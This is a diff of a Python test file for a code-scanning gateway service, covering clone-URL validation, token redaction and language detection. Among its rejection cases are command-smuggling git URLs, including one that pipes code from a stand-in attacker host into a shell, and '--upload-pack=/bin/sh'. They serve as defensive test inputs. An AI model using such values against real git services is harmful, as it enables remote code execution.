@@ -1,104 +1,36 @@
-import json
+import os
 import pytest
 from unittest.mock import patch, AsyncMock, MagicMock
 
-from src.services.gateway.service import GatewayService
+from src.services.gateway.service import (
+    GatewayService, redact_credentials, validate_clone_url,
+)
 
+SCAN_ROW = {
+    "id": "scan-1", "organization_id": "org-9", "project_id": "p1",
+    "connection_id": "conn-1", "repo": "acme/app", "branch": "main",
+    "commit_sha": "abc1234",
+}
 
-def _service(fake_redis):
-    with patch("src.services.gateway.service.get_redis_client", return_value=fake_redis):
-        return GatewayService()
-
-
-@pytest.mark.asyncio
-@patch("src.services.gateway.service.asyncio.to_thread")
-async def test_process_job_fans_out_to_every_engine(mock_to_thread, fake_redis):
-    async def runner(func, *args, **kwargs):
-        return "s3://test-uri/code.zip" if func.__name__ == "upload_codebase" else None
-    mock_to_thread.side_effect = runner
-
-    service = _service(fake_redis)
-    await service.process_job("job-1", {
-        "cloneUrl": "https://github.com/test/repo",
-        "commitSha": "abc1234",
-        "scanId": "scan-1",
-    })
-
-    channels = [c for c, _ in fake_redis.published]
-    assert set(channels) == {"scan:semgrep", "scan:regex", "scan:sonarqube", "scan:codeql"}
-
-    body = json.loads(fake_redis.published[0][1])
-    assert body["job_id"] == "job-1"
-    assert body["scan_id"] == "scan-1"
-    assert body["uri"] == "s3://test-uri/code.zip"
-    assert body["commit_sha"] == "abc1234"
-
-
-@pytest.mark.asyncio
-@patch("src.services.gateway.service.execute_query", new_callable=AsyncMock)
-@patch("src.services.gateway.service.get_cloudflare_secret", new_callable=AsyncMock)
-@patch("src.services.gateway.service.asyncio.to_thread")
-async def test_process_job_marks_failure_and_publishes_nothing(
-    mock_to_thread, mock_secret, mock_exec, fake_redis
-):
-    mock_secret.side_effect = ValueError("no token")
-    mock_to_thread.side_effect = Exception("Clone failed")
-
-    service = _service(fake_redis)
-    await service.process_job("job-1", {
-        "cloneUrl": "https://github.com/o/r.git", "commitSha": "abc", "scanId": "scan-1",
-    })
-
-    assert fake_redis.published == []
-    assert mock_exec.await_count == 2
-
-    job_sql, job_payload, job_id = mock_exec.await_args_list[0][0]
-    assert "failed" in job_sql
-    assert "Clone failed" in job_payload
-    assert job_id == "job-1"
-
-    scan_sql = mock_exec.await_args_list[1][0][0]
-    assert "security_scans" in scan_sql
-
-
-def test_detect_language_by_manifest(tmp_path):
-    (tmp_path / "package.json").write_text("{}")
-    with patch("src.services.gateway.service.get_redis_client", return_value=MagicMock()):
-        assert GatewayService()._detect_language(str(tmp_path)) == "javascript"
-
-
-def test_detect_language_falls_back_to_unknown(tmp_path):
-    (tmp_path / "notes.txt").write_text("nothing to detect")
-    with patch("src.services.gateway.service.get_redis_client", return_value=MagicMock()):
-        assert GatewayService()._detect_language(str(tmp_path)) == "unknown"
+PAYLOAD = {"scanId": "scan-1", "tenantId": "org-9", "options": {}}
 
 
 # --- clone URL validation -------------------------------------------------
 
-import os
-from src.services.gateway.service import validate_clone_url, redact_credentials
-
-
 @pytest.mark.parametrize("url", [
     "https://github.com/org/repo.git",
     "https://gitlab.self-hosted.example.com/team/repo.git",
-    "  https://github.com/org/repo.git  ",
 ])
 def test_validate_clone_url_accepts_https(url):
-    assert validate_clone_url(url) == url.strip()
+    assert validate_clone_url(url) == url
 
 
-@pytest.mark.parametrize("url,reason", [
-    ("ext::sh -c 'curl evil.example.com|sh'", "ext:: runs an arbitrary command"),
-    ("file:///etc", "file:// reaches the local filesystem"),
-    ("ssh://git@internal/repo.git", "ssh:// reaches internal hosts"),
-    ("git://github.com/org/repo.git", "git:// is unauthenticated and not https"),
-    ("--upload-pack=/bin/sh", "git would parse this as an option"),
-    ("https://", "no host"),
-    ("", "empty"),
-    ("   ", "whitespace only"),
+@pytest.mark.parametrize("url", [
+    "ext::sh -c 'curl evil.example.com|sh'",
+    "file:///etc", "ssh://git@internal/repo.git", "git://github.com/o/r.git",
+    "--upload-pack=/bin/sh", "https://", "", "   ",
 ])
-def test_validate_clone_url_rejects_dangerous_input(url, reason):
+def test_validate_clone_url_rejects_dangerous_input(url):
     with pytest.raises(ValueError):
         validate_clone_url(url)
 
@@ -116,12 +48,8 @@ def test_any_https_host_allowed_when_unset():
     assert validate_clone_url("https://git.internal.example.com/team/repo.git")
 
 
-# --- credential handling --------------------------------------------------
-
 @pytest.mark.parametrize("raw,expected", [
-    ("https://user:ghp_secret@github.com/o/r.git", "https://***@github.com/o/r.git"),
-    ("clone of https://x-access-token:abc123@gitlab.com/o/r.git failed",
-     "clone of https://***@gitlab.com/o/r.git failed"),
+    ("https://x-access-token:ghp_secret@github.com/o/r.git", "https://***@github.com/o/r.git"),
     ("https://github.com/o/r.git", "https://github.com/o/r.git"),
     ("", ""),
 ])
@@ -129,81 +57,138 @@ def test_redact_credentials(raw, expected):
     assert redact_credentials(raw) == expected
 
 
+# --- language detection ---------------------------------------------------
+
+def test_detects_every_language_not_just_the_first(tmp_path):
+    """
+    CodeQL builds one database per language. Returning a single value made a
+    polyglot repo nondeterministic and silently skipped the rest of the code.
+    """
+    (tmp_path / "package.json").write_text("{}")
+    (tmp_path / "go.mod").write_text("module x")
+    (tmp_path / "main.py").write_text("x = 1")
+
+    languages = GatewayService().detect_languages(str(tmp_path))
+    assert set(languages) >= {"javascript", "go", "python"}
+
+
+def test_detection_skips_dependency_directories(tmp_path):
+    (tmp_path / "node_modules" / "pkg").mkdir(parents=True)
+    (tmp_path / "node_modules" / "pkg" / "x.rb").write_text("puts 1")
+    (tmp_path / "main.py").write_text("x = 1")
+
+    assert GatewayService().detect_languages(str(tmp_path)) == ["python"]
+
+
+def test_detection_is_bounded(tmp_path, monkeypatch):
+    """The gateway README requires lightweight heuristics, not a full walk."""
+    import src.services.gateway.service as svc
+    monkeypatch.setattr(svc, "MAX_DETECT_FILES", 3)
+    for i in range(50):
+        (tmp_path / f"f{i}.txt").write_text("x")
+    (tmp_path / "zzz.rb").write_text("puts 1")
+
+    assert "ruby" not in GatewayService().detect_languages(str(tmp_path))
+
+
+def test_no_recognizable_language(tmp_path):
+    (tmp_path / "notes.txt").write_text("nothing")
+    assert GatewayService().detect_languages(str(tmp_path)) == []
+
+
+# --- job processing -------------------------------------------------------
+
 @pytest.mark.asyncio
-@patch("src.services.gateway.service.execute_query", new_callable=AsyncMock)
-@patch("src.services.gateway.service.get_cloudflare_secret", new_callable=AsyncMock)
+@patch("src.services.gateway.service.resolve_clone_url", new_callable=AsyncMock)
+@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
 @patch("src.services.gateway.service.asyncio.to_thread")
-async def test_token_never_leaks_into_logs_or_database(mock_to_thread, mock_secret, mock_exec, fake_redis, capsys):
-    """
-    The injected token exists only in the URL handed to git. A clone failure
-    previously wrote str(err) — which carries the full URL — straight to stdout
-    and pgboss.job.output.
-    """
-    mock_secret.return_value = "ghp_supersecret"
-    mock_to_thread.side_effect = Exception(
-        "Cmd('git') failed: clone https://x-access-token:ghp_supersecret@github.com/o/r.git"
-    )
+async def test_fans_out_to_every_engine_queue(mock_thread, mock_scan, mock_url, published):
+    mock_scan.return_value = SCAN_ROW
+    mock_url.return_value = "https://x-access-token:ghp_secret@github.com/acme/app.git"
 
-    service = _service(fake_redis)
-    await service.process_job("job-1", {
-        "cloneUrl": "https://github.com/o/r.git", "commitSha": "abc", "scanId": "scan-1",
-    })
+    async def runner(func, *args, **kwargs):
+        if func.__name__ == "upload_codebase":
+            return "s3://b/codebases/scan-1.zip"
+        if func.__name__ == "detect_languages":
+            return ["python"]
+        return None
+    mock_thread.side_effect = runner
 
-    written = mock_exec.await_args_list[0][0][1]
-    assert "ghp_supersecret" not in written
-    assert "***@github.com" in written
+    await GatewayService().process_job("job-1", PAYLOAD)
+
+    queues = [q for q, _ in published]
+    assert set(queues) == {"scan-semgrep", "scan-regex", "scan-sonarqube", "scan-codeql"}
+
+    body = published[0][1]
+    assert body["scan_id"] == "scan-1"
+    assert body["tenant_id"] == "org-9"
+    assert body["uri"] == "s3://b/codebases/scan-1.zip"
+    assert body["commit_sha"] == "abc1234"
+    assert body["languages"] == ["python"]
+
+
+@pytest.mark.asyncio
+@patch("src.services.gateway.service.resolve_clone_url", new_callable=AsyncMock)
+@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
+@patch("src.services.gateway.service.asyncio.to_thread")
+async def test_token_never_reaches_the_published_message(mock_thread, mock_scan, mock_url, published):
+    mock_scan.return_value = SCAN_ROW
+    mock_url.return_value = "https://x-access-token:ghp_supersecret@github.com/acme/app.git"
+
+    async def runner(func, *args, **kwargs):
+        return "s3://b/x.zip" if func.__name__ == "upload_codebase" else ["python"]
+    mock_thread.side_effect = runner
+
+    await GatewayService().process_job("job-1", PAYLOAD)
+
+    for _, body in published:
+        assert "ghp_supersecret" not in str(body)
+
+
+@pytest.mark.asyncio
+@patch("src.services.gateway.service.fail_scan", new_callable=AsyncMock)
+@patch("src.services.gateway.service.resolve_clone_url", new_callable=AsyncMock)
+@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
+@patch("src.services.gateway.service.asyncio.to_thread")
+async def test_clone_failure_redacts_the_token(mock_thread, mock_scan, mock_url, mock_fail,
+                                               published, capsys):
+    mock_scan.return_value = SCAN_ROW
+    mock_url.return_value = "https://x-access-token:ghp_supersecret@github.com/acme/app.git"
+    mock_thread.side_effect = Exception(
+        "Cmd('git') failed: clone https://x-access-token:ghp_supersecret@github.com/acme/app.git")
+
+    with pytest.raises(RuntimeError) as excinfo:
+        await GatewayService().process_job("job-1", PAYLOAD)
+
+    assert "ghp_supersecret" not in str(excinfo.value)
+    assert "***@github.com" in str(excinfo.value)
     assert "ghp_supersecret" not in capsys.readouterr().out
+    assert published == [], "a failed clone must not fan out to the engines"
+
+    reason = mock_fail.await_args[0][1]
+    assert "ghp_supersecret" not in reason
 
 
 @pytest.mark.asyncio
-@patch("src.services.gateway.service.get_cloudflare_secret", new_callable=AsyncMock)
-@patch("src.services.gateway.service.asyncio.to_thread")
-async def test_token_is_injected_but_never_published(mock_to_thread, mock_secret, fake_redis):
-    mock_secret.return_value = "ghp_supersecret"
+@patch("src.services.gateway.service.fail_scan", new_callable=AsyncMock)
+@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
+async def test_unknown_scan_fails_the_job(mock_scan, mock_fail, published):
+    mock_scan.return_value = None
 
-    async def runner(func, *args, **kwargs):
-        return "s3://b/codebases/scan-1.zip" if func.__name__ == "upload_codebase" else None
-    mock_to_thread.side_effect = runner
-
-    service = _service(fake_redis)
-    await service.process_job("job-1", {
-        "cloneUrl": "https://github.com/o/r.git", "commitSha": "abc", "scanId": "scan-1",
-    })
-
-    clone_url_used = mock_to_thread.call_args_list[0][0][1]
-    assert clone_url_used == "https://x-access-token:ghp_supersecret@github.com/o/r.git"
-    for _, msg in fake_redis.published:
-        assert "ghp_supersecret" not in msg
+    with pytest.raises(RuntimeError, match="not found"):
+        await GatewayService().process_job("job-1", PAYLOAD)
+    assert published == []
 
 
 @pytest.mark.asyncio
-@patch("src.services.gateway.service.get_cloudflare_secret", new_callable=AsyncMock)
-@patch("src.services.gateway.service.asyncio.to_thread")
-async def test_missing_token_clones_anonymously(mock_to_thread, mock_secret, fake_redis):
-    """Public repositories must still clone when no token is configured."""
-    mock_secret.side_effect = ValueError("Secret 'GIT_CLONE_TOKEN' not found")
+@patch("src.services.gateway.service.fail_scan", new_callable=AsyncMock)
+@patch("src.services.gateway.service.resolve_clone_url", new_callable=AsyncMock)
+@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
+async def test_rejected_clone_url_fails_before_cloning(mock_scan, mock_url, mock_fail, published):
+    mock_scan.return_value = SCAN_ROW
+    mock_url.return_value = "ext::sh -c 'id'"
 
-    async def runner(func, *args, **kwargs):
-        return "s3://b/codebases/scan-1.zip" if func.__name__ == "upload_codebase" else None
-    mock_to_thread.side_effect = runner
-
-    service = _service(fake_redis)
-    await service.process_job("job-1", {
-        "cloneUrl": "https://github.com/o/r.git", "commitSha": "abc", "scanId": "scan-1",
-    })
-
-    assert mock_to_thread.call_args_list[0][0][1] == "https://github.com/o/r.git"
-    assert len(fake_redis.published) == 4
-
-
-@pytest.mark.asyncio
-@patch("src.services.gateway.service.execute_query", new_callable=AsyncMock)
-async def test_rejected_url_fails_the_job_without_cloning(mock_exec, fake_redis):
-    service = _service(fake_redis)
-    await service.process_job("job-1", {
-        "cloneUrl": "ext::sh -c 'id'", "commitSha": "abc", "scanId": "scan-1",
-    })
-
-    assert fake_redis.published == []
-    assert mock_exec.await_count == 2
-    assert "not allowed" in mock_exec.await_args_list[0][0][1]
+    with pytest.raises(RuntimeError, match="not allowed"):
+        await GatewayService().process_job("job-1", PAYLOAD)
+    assert published == []
+    mock_fail.assert_awaited_once()
